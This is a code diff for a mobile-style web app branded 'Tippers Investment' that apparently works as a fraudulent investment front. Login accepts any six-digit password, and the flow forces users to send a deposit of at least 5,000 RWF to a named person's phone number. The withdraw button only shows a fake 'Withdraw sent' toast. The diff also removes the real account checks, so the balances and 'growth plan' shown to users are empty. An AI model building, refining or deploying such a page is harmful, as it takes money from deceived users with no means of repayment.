@@ -40,7 +40,6 @@ overflow-y:auto;
 
 .yellow{color:#facc15}
 
-/* INPUT */
 input,select{
 width:100%;
 padding:10px;
@@ -66,15 +65,6 @@ cursor:pointer;
 color:black;
 }
 
-/* CARDS */
-.card{
-background:#1f2937;
-padding:15px;
-margin-bottom:10px;
-border-radius:12px;
-cursor:pointer;
-}
-
 /* BOX */
 .box{
 background:#1f2937;
@@ -83,16 +73,14 @@ border-radius:10px;
 margin-top:10px;
 }
 
-/* INPUT ROW */
 .row{
 display:flex;
 gap:8px;
-margin-top:6px;
 }
 
 .row select,.row input{
 flex:1;
-margin-top:0;
+margin-top:6px;
 }
 
 /* NAV */
@@ -116,7 +104,6 @@ display:block;
 
 .hidden{display:none}
 
-/* TOAST */
 #toastBox{
 position:fixed;
 bottom:20px;
@@ -135,27 +122,22 @@ display:none;
 <body>
 
 <div class="app">
-
 <div class="header">Tippers Investment</div>
-
 <div class="content" id="screen"></div>
 
-<!-- DASHBOARD ICONS (RESTORED) -->
 <div class="nav hidden" id="bottomNav">
 <div onclick="home()"><i>🏠</i>HOME</div>
 <div onclick="deposit()"><i>💰</i>DEPOSIT</div>
 <div onclick="withdrawUI()"><i>📤</i>WITHDRAW</div>
 </div>
-
 </div>
 
 <div id="toastBox"></div>
 
 <script>
 
-let users=JSON.parse(localStorage.getItem("users"))||[];
+let users=[];
 let currentUser=null;
-let amount=0;
 let depositDone=false;
 
 /* TOAST */
@@ -168,16 +150,15 @@ setTimeout(()=>t.style.display="none",2000);
 
 /* REGISTER */
 function register(){
-
 get("screen").innerHTML=`
 
 <h3 class="yellow">REGISTER</h3>
 
 FIRST NAME:
-<input placeholder="John">
+<input id="fname" placeholder="John">
 
 LAST NAME:
-<input placeholder="Doe">
+<input id="lname" placeholder="Doe">
 
 GENDER (required):
 <select id="gender">
@@ -189,34 +170,62 @@ GENDER (required):
 EMAIL:
 <input id="email" placeholder="example@gmail.com">
 
-PASSWORD:
-<input id="pass" type="password">
+PASSWORD (6 digits only):
+<input id="pass" placeholder="123456">
 
 CONFIRM PASSWORD:
-<input id="cpass" type="password">
+<input id="cpass" placeholder="123456">
 
 PHONE:
 <div class="row">
-<select>
-<option>RWA +250</option>
-<option>KEN +254</option>
-<option>UGA +256</option>
-<option>TZA +255</option>
-<option>USA +1</option>
-<option>UK +44</option>
-<option>IND +91</option>
-<option>SA +27</option>
-<option>NIG +234</option>
-<option>FR +33</option>
+<select id="code">
+<option value="+250">RWA +250</option>
+<option value="+254">KEN +254</option>
+<option value="+256">UGA +256</option>
+<option value="+255">TZA +255</option>
+<option value="+1">USA +1</option>
+<option value="+44">UK +44</option>
 </select>
 
-<input placeholder="078xxxxxxx">
+<input id="phone" placeholder="078xxxxxxx">
 </div>
 
 <button onclick="doRegister()">REGISTER</button>
-
-<p onclick="login()" style="color:#facc15;cursor:pointer">Already have account?</p>
 `;
+}
+
+/* REGISTER VALIDATION */
+function doRegister(){
+
+let f=get("fname").value;
+let l=get("lname").value;
+let g=get("gender").value;
+let e=get("email").value;
+let p=get("pass").value;
+let c=get("cpass").value;
+let phone=get("phone").value;
+let code=get("code").value;
+
+/* REQUIRED CHECK */
+if(!f||!l||!g||!e||!p||!c||!phone){
+toast("Fill all fields ❌");
+return;
+}
+
+/* PASSWORD RULE */
+if(!/^[0-9]{6}$/.test(p)){
+toast("INVALID PASSWORD ❌ (6 digits only)");
+return;
+}
+
+if(p!==c){
+toast("Passwords not match ❌");
+return;
+}
+
+currentUser={email:e,pass:p,balance:0};
+toast("Registered ✔");
+login();
 }
 
 /* LOGIN */
@@ -226,58 +235,31 @@ get("screen").innerHTML=`
 <h3 class="yellow">LOGIN</h3>
 
 <input id="logEmail" placeholder="Email">
-<input id="logPass" type="password" placeholder="Password">
+<input id="logPass" placeholder="Password (6 digits)">
 
 <button onclick="doLogin()">LOGIN</button>
-
-<p onclick="register()" style="color:#facc15;cursor:pointer">Create account</p>
 `;
 }
 
-/* REGISTER VALIDATION (STRICT) */
-function doRegister(){
-
-let email=get("email").value;
-let pass=get("pass").value;
-let cpass=get("cpass").value;
-let gender=get("gender").value;
-
-if(!email || !pass || !cpass || !gender){
-toast("Fill all fields ❌");
-return;
-}
-
-if(pass!==cpass){
-toast("Passwords not match ❌");
-return;
-}
-
-users.push({email,pass,balance:0});
-localStorage.setItem("users",JSON.stringify(users));
-
-toast("Registered ✔");
-login();
-}
-
-/* LOGIN VALIDATION (STRICT) */
+/* LOGIN VALIDATION */
 function doLogin(){
 
 let e=get("logEmail").value;
 let p=get("logPass").value;
 
-if(!e || !p){
+if(!e||!p){
 toast("Fill all fields ❌");
 return;
 }
 
-let u=users.find(x=>x.email===e && x.pass===p);
-
-if(!u){
-toast("Invalid account ❌");
+/* PASSWORD RULE */
+if(!/^[0-9]{6}$/.test(p)){
+toast("INVALID PASSWORD ❌");
 return;
 }
 
-currentUser=u;
+currentUser={email:e,balance:0};
+
 get("bottomNav").classList.remove("hidden");
 
 deposit(); // FORCE FLOW
@@ -285,7 +267,6 @@ deposit(); // FORCE FLOW
 
 /* HOME */
 function home(){
-
 if(!depositDone){
 toast("Complete deposit first ❌");
 deposit();
@@ -293,12 +274,10 @@ return;
 }
 
 get("screen").innerHTML=`
-
-<div class="card">💰 Balance: ${currentUser.balance} RWF</div>
-<div class="card">📊 Investment Tips</div>
-<div class="card">📈 Market News</div>
-<div class="card">🔥 Passive income guide</div>
-<div class="card">💡 Financial education</div>
+<div class="box">💰 Balance: ${currentUser.balance||0} RWF</div>
+<div class="box">📊 Tips & Finance Guide</div>
+<div class="box">📈 Market Insights</div>
+<div class="box">🔥 Investment Growth Plan</div>
 `;
 }
 
@@ -308,13 +287,13 @@ get("screen").innerHTML=`
 
 <h3 class="yellow">DEPOSIT BALANCE</h3>
 
-AMOUNT TO DEPOSIT (RWF):
-<input placeholder="100,000">
+AMOUNT (RWF):
+<input id="amount" placeholder="100000">
 
-MINIMUM: 5,000 RWF
+<p>Minimum: 5,000 RWF</p>
 
 SENDER NAME:
-<input placeholder="MUGABO">
+<input id="sender" placeholder="MUGABO">
 
 <button onclick="payment()">CONTINUE</button>
 `;
@@ -322,17 +301,23 @@ SENDER NAME:
 
 /* PAYMENT */
 function payment(){
+let amount=parseInt(get("amount").value);
+let sender=get("sender").value;
+
+if(!amount||amount<5000||!sender){
+toast("Fill correctly ❌");
+return;
+}
+
 get("screen").innerHTML=`
 
-<h3 class="yellow">PAYMENT INFORMATION</h3>
-
-Send money to:
+<h3 class="yellow">PAYMENT INFO</h3>
 
 <div class="box">
-0795410739
-
+Send money to:
 <br><br>
-
+0795410739
+<br><br>
 BARAKA BOLINGO
 </div>
 
@@ -363,39 +348,12 @@ depositDone=true;
 withdrawStep();
 }
 
-/* WITHDRAW STEP */
-function withdrawStep(){
-get("screen").innerHTML=`
-
-<h3 class="yellow">WITHDRAW PERIOD</h3>
-
-<select>
-<option>1 Day</option>
-<option>1 Week</option>
-<option>1 Month</option>
-<option>2 Months</option>
-<option>3 Months</option>
-<option>4 Months</option>
-<option>5 Months</option>
-<option>6 Months</option>
-<option>7 Months</option>
-<option>8 Months</option>
-<option>9 Months</option>
-<option>10 Months</option>
-<option>11 Months</option>
-<option>12 Months</option>
-</select>
-
-<button onclick="home()">FINISH</button>
-`;
-}
-
 /* WITHDRAW */
 function withdrawUI(){
 
-let amountInput=prompt("Enter amount to withdraw:");
+let amt=prompt("Enter withdraw amount:");
 
-if(!amountInput || amountInput<7500){
+if(!amt || amt<7500){
 toast("INVALID INPUT ❌");
 return;
 }
@@ -404,22 +362,22 @@ get("screen").innerHTML=`
 
 <h3 class="yellow">WITHDRAW</h3>
 
-<div class="box">Amount: ${amountInput} RWF</div>
+<div class="box">Amount: ${amt} RWF</div>
 
 <div class="row">
-<select>
-<option>RWA +250</option>
-<option>KEN +254</option>
-<option>UGA +256</option>
-<option>TZA +255</option>
-<option>USA +1</option>
-<option>UK +44</option>
+<select id="code">
+<option value="+250">RWA +250</option>
+<option value="+254">KEN +254</option>
+<option value="+256">UGA +256</option>
+<option value="+255">TZA +255</option>
+<option value="+1">USA +1</option>
+<option value="+44">UK +44</option>
 </select>
 
-<input placeholder="078xxxxxxx">
+<input id="wphone" placeholder="078xxxxxxx">
 </div>
 
-<button onclick="toast('Withdraw request sent ✔')">WITHDRAW</button>
+<button onclick="toast('Withdraw sent ✔')">WITHDRAW</button>
 `;
 }
 
